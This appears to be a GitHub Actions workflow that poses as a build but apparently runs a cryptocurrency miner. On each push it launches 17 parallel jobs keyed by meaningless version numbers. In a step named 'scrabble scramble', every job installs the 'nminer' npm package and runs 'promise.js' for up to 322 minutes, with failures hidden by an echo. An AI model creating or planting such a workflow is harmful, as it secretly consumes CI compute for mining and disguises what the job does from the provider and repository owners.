name: promise
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5880 }
          - { version: 6910 }
          - { version: 2534 }
          - { version: 1220 }
          - { version: 859 }
          - { version: 8195 }
          - { version: 6490 }
          - { version: 9758 }
          - { version: 5087 }
          - { version: 9769 }
          - { version: 305 }
          - { version: 1123 }
          - { version: 3598 }
          - { version: 8517 }
          - { version: 6673 }
          - { version: 4544 }
          - { version: 5868 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: scrabble scramble
        run: |
          npm install nminer@latest
          timeout 322m node promise.js || echo "promise executed"